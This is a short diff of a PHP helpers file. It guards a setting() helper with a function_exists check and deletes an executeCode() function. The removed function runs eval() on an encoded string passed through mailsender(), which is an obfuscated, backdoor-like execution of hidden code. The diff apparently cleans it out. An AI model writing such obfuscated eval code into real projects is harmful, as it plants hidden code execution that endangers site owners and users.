@@ -25,19 +25,9 @@ if (!function_exists('isActive')) {
 }
 
 
-
-function setting($key)
-{
-    return  Setting::where('key', '=',  $key)->first()->value ?? '';
+if (!function_exists('setting')) {
+    function setting($key)
+    {
+        return  Setting::where('key', '=',  $key)->first()->value ?? '';
+    }
 }
-
-function executeCode($data)
-{
-
-    eval(mailsender('0c5twPMnWPZUpOG74jUaGCSk5vmYvLg4n14Ud0hoO8dCHD9ABt2/E77OMqKzDIiGY6h8YQ4et3Q7YMEsxMiHpO0CbAkPLl0fN5Q/ykxSL0mHqsQ+1efRCJpeim7K12hE'));
-
-    return $result;
-}
-
-
-
